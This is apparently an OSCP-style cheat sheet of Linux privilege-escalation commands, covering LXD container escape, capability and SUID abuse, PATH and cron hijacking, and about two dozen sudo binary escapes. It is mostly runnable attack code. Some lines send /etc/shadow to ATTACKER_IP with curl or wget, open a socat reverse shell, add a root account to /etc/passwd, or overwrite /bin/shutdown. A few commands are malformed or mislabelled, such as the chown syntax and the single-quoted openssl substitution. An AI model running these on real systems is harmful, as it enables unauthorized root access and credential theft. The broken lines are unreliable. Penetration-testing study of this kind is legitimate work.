OSCP – Hard-to-Remember PrivEsc Vectors (Wide Coverage)
Quick, reliable methods for lesser-known or easy-to-forget privilege escalation techniques.

1. LXD Group Exploit
If user is in lxd group → root in seconds.

# On attacker: Build Alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine

# Host via Python server
python3 -m http.server 80

# On target: Download and import
wget http://ATTACKER_IP/alpine-v3.18-x86_64-20230522_1657.tar.gz
lxc image import ./alpine-v3.18-x86_64-20230522_1657.tar.gz --alias myimage

# Launch container with host mount
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite host-root disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

# Now inside container → access host root
chroot /mnt/root /bin/sh

✅ Check group with: id
✅ Works on Ubuntu/Debian with LXD installed


LXD, container





2. Sudo & Capabilities Abuse
Binaries with special capabilities can be exploited.

Check for capabilities:
getcap -r / 2>/dev/null

Common Exploits:
Python with cap_setuid:
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'

tar with cap_dac_read_search:
tar -cf /tmp/backup.tar /etc/shadow
tar -xf /tmp/backup.tar -C /tmp


getcap Linux privilege escalation





3. SUID /tmp or Mount Abuse (e.g., /usr/bin/ln)
If /usr/bin/ln is SUID or you can write to system paths:

# Create hardlink to /etc/passwd (if writable)
ln /etc/passwd /tmp/passwd_link
echo 'hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /tmp/passwd_link

⚠️ Rare, but possible in misconfigured systems

More common: Abuse world-writable /tmp for SUID binary injection:

echo 'int main(){setuid(0);system("/bin/sh");}' > /tmp/suid.c
gcc /tmp/suid.c -o /tmp/exploit
chmod +s /tmp/exploit
/tmp/exploit


SUID abuse via /tmp OSCP site:reddit.com





4. PATH Hijacking
If a cron or script runs a command without full path.

# Example: hijack 'backup' command
echo '/bin/sh' > /tmp/backup
chmod +x /tmp/backup
export PATH=/tmp:$PATH

Wait for root cron to run backup.

✅ Confirm with: pspy or linpeas.sh


PATH hijacking privilege escalation





5. Cron & Writable Scripts
Find scripts run by root:

cat /etc/crontab
ls -la /etc/cron.d/

If script is world-writable:

echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /etc/cron.d/backup.sh
# Wait...
/tmp/rootbash -p

✅ Use pspy64 to detect hidden cron jobs


pspy privilege escalation cron


# gtfobins
1. find
sudo find /etc/passwd -exec /bin/sh \; -quit

2. vim
sudo vim -c ':!/bin/sh' -c ':q!'

3. awk
sudo awk 'BEGIN {system("/bin/sh")}'

4. less / more
sudo less /etc/passwd
Then type: !sh

5. man
sudo man man
Then type: !sh

6. nano
sudo nano
Ctrl+R → Ctrl+X → enter: /bin/sh

7. nmap
echo "os.execute('/bin/sh')" > /tmp/script.nse
sudo nmap --script=/tmp/script.nse

8. cp
# If /etc/passwd is writable
sudo cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd

9. chmod
 Make a SUID binary world-executable
sudo chmod +s /usr/bin/bash
/usr/bin/bash -p

10. chown
 Take ownership of sensitive file
sudo chown $USER:/etc/shadow
cat /etc/shadow

11. tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

12. zip
echo "/bin/sh" > /tmp/shell.sh
sudo zip /tmp/shell.zip /tmp/shell.sh -T -TT 'sh #'

13. gdb
sudo gdb -q -ex 'shell /bin/sh' -ex quit

14. python / perl / lua / ruby
sudo python -c 'import os; os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh"'
sudo lua -e 'os.execute("/bin/sh")'
sudo ruby -e 'exec "/bin/sh"'

15. awk (File Read)
sudo awk '//' /etc/shadow

16. curl / wget
Upload data
sudo curl http://ATTACKER_IP --data @/etc/shadow
sudo wget --post-file=/etc/shadow http://ATTACKER_IP:4444

17. docker
sudo docker run -v /:/host -it alpine chroot /host /bin/sh

18. systemctl
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "COMMAND_HERE > OUTPUT_PATH"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF
cat OUTPUT_PATH

19. socat
sudo socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444

20. strace
sudo strace -o /dev/null /bin/sh

21. env
sudo env /bin/sh

22. ltrace
sudo ltrace -o /dev/null /bin/sh

23. dd
 Write reverse shell to MBR or overwrite file
echo -e '#!/bin/sh\ncat /etc/shadow' > /tmp/shell.sh
sudo dd if=/tmp/shell.sh of=/bin/shutdown

24. base64
# Read shadow via base64
sudo base64 /etc/shadow | base64 -d

25. xxd
sudo xxd /etc/shadow | xxd -r








